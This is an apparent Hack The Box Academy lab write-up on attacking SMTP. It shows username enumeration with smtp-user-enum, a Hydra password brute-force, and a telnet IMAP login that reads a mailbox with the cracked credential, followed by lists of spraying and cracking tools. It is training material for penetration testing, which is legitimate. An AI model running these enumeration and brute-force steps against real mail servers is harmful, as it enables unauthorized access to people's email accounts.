# 🛰️ HTB Academy SMTP Attack Module

## 🔍 Lab Exercise 1: Username Enumeration
[!INFO] This lab demonstrates how to enumerate available usernames for a given domain using `smtp-user-enum`.

### Commands & Steps
```bash
smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.203.12
```
This command uses the `-M` option to specify the enumeration method (RCPT), `-U` for a file containing usernames, `-D` to target the domain `inlanefreight.htb`, and `-t` for the IP address of the SMTP server.

### Output & Results
```bash
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... users.list
Target count ............. 1
Username count ........... 79
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

### Scan started at Thu Jun 30 22:02:35 2022 ###
10.129.203.12: marlin@inlanefreight.htb exists
### Scan completed at Thu Jun 30 22:02:42 2022 ###
1 results.

79 queries in 7 seconds (11.3 queries / sec)
```
The output shows that `marlin@inlanefreight.htb` is a valid username on the SMTP server.

## 🔍 Lab Exercise 2: Email Access & Flag Extraction
[!INFO] This lab involves gaining access to an email account and extracting flag content using password attacks with Hydra followed by manual IMAP login.

### Commands & Steps

#### Step 1: Password Attack with Hydra
```bash
hydra -l marlin@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt smtp://10.129.203.12 -f
```
This command uses `Hydra` to brute-force the password for `marlin@inlanefreight.htb`.

#### Step 2: IMAP Email Access
```bash
telnet 10.129.203.12 143

Trying 10.129.203.12...
Connected to 10.129.203.12.
Escape character is '^]'.
* OK IMAPrev1

11 login "marlin@inlanefreight.htb" "poohbear"
11 OK LOGIN completed

12 select "INBOX"
* 1 EXISTS
* 1 RECENT
* FLAGS (\Deleted \Seen \Draft \Answered \Flagged)
* OK [UIDVALIDITY 1650465305] current uidvalidity
* OK [UIDNEXT 2] next uid
* OK [PERMANENTFLAGS (\Deleted \Seen \Draft \Answered \Flagged)] limited
12 OK [READ-WRITE] SELECT completed

13 FETCH 1 BODY[]
* 1 FETCH (BODY[] {640}
Return-Path: marlin@inlanefreight.htb
Received: from [10.10.14.33] (Unknown [10.10.14.33])
	by WINSRV02 with ESMTPA
	; Wed, 20 Apr 2022 14:49:32 -0500
Message-ID: <85cb72668d8f5f8436d36f085e0167ee78cf0638.camel@inlanefreight.htb>
Subject: Password change
From: marlin <marlin@inlanefreight.htb>
To: administrator@inlanefreight.htb
Cc: marlin@inlanefreight.htb
Date: Wed, 20 Apr 2022 15:49:11 -0400
Content-Type: text/plain; charset="UTF-8"
User-Agent: Evolution 3.38.3-1 
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit

Hi admin,

How can I change my password to something more secure? 

flag: HTB{...}

)
13 OK FETCH completed
```
This section uses `telnet` to manually connect to the IMAP server and log in with the credentials obtained from the Hydra attack. The email content is then fetched using the `FETCH` command.

## 📚 Key Lab Learning Points

### SMTP User Enumeration (Lab 1)
- **Tools Used:** smtp-user-enum
- **Methodology:**
  - Enumeration of usernames via RCPT method.
  - Targeting specific domains for enumeration.
  - Utilizing wordlists to discover valid usernames.
- **Result:** `marlin@inlanefreight.htb`

### Multi-Protocol Attack Chain (Lab 2)
- **Tools Used:** Hydra, Telnet
- **Methodology:**
  - SMTP password attack with Hydra using a wordlist.
  - IMAP email access to manually fetch emails via telnet.
- **Credentials and Actions:**
  - Credentials discovered: `marlin@inlanefreight.htb:poohbear`
  - Email content extraction revealing the flag.

### Practical Tool Usage
- smtp-user-enum for enumeration
- Hydra for password attacks
- Telnet for manual IMAP access
- Commands: LOGIN, SELECT, FETCH

### Real-World Attack Flow
- Enumeration → Credential Attack → Email Access
- Weak password exploitation (using rockyou.txt)
- Email-based intelligence gathering
- Flag extraction from email content.

---

## 🔧 Tools & Resources

### Essential Email Service Tools
```bash
# User enumeration
smtp-user-enum          # VRFY/EXPN/RCPT enumeration
nmap                    # smtp-enum-users script  
telnet/nc              # Manual testing

# Mail testing & relay
swaks                  # SMTP testing and open relay
sendEmail              # Email sending tool
msmtp                  # Mail transfer agent

# Cloud enumeration & attacks
o365spray              # Office 365 enumeration/spraying
credking               # Gmail/Okta attacks
mailsniper             # Office 365 attacks

# Password attacks  
hydra                  # Multi-protocol password attacks
medusa                 # Network login cracker
ncrack                 # Network authentication cracker
```

### Useful Nmap SMTP Scripts
```bash
smtp-commands          # Available SMTP commands
smtp-enum-users        # User enumeration  
smtp-ntlm-info        # NTLM information
smtp-open-relay       # Open relay detection
smtp-strangeport      # Non-standard ports
smtp-vuln-cve2010-4344  # Postfix vulnerability
smtp-vuln-cve2011-1720  # Postfix vulnerability  
smtp-vuln-cve2011-1764  # Exim vulnerability
```

---

## 🔗 Related Techniques

- **[Email Reconnaissance](../services/smtp-enumeration.md)** - Information gathering
- **[Social Engineering](../social-engineering/)** - Email-based attacks
- **[Phishing](../social-engineering/phishing.md)** - Malicious email campaigns
- **[Domain Attacks](dns-attacks.md)** - DNS-based email attacks
- **[Password Attacks](../passwords-attacks/)** - SMTP credential attacks

---

## 📚 References

- **HTB Academy** - Attacking Common Services Module
- **RFC 5321** - Simple Mail Transfer Protocol
- **smtp-user-enum** - SMTP user enumeration tool
- **OWASP Email Security** - Email attack vectors
- **Postfix Documentation** - SMTP server configuration